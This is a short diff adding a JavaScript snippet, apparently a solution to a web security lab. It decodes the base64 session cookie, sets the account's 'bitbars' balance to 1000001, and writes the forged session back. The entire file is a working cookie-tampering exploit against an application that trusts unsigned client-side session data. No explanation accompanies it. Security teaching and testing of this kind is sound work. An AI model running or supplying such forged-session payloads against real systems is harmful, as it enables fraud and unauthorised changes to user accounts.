@@ -1,0 +1,8 @@
+let cookieString = document.cookie;
+let base64Encoded = cookieString.split('=')[1];
+let decodedString = window.atob(base64Encoded);
+let parsedObject = JSON.parse(decodedString);
+parsedObject.account["bitbars"] = 1000001;
+console.log(parsedObject);
+let newEncoded = window.btoa(JSON.stringify(parsedObject));
+document.cookie = `session=${newEncoded}`;
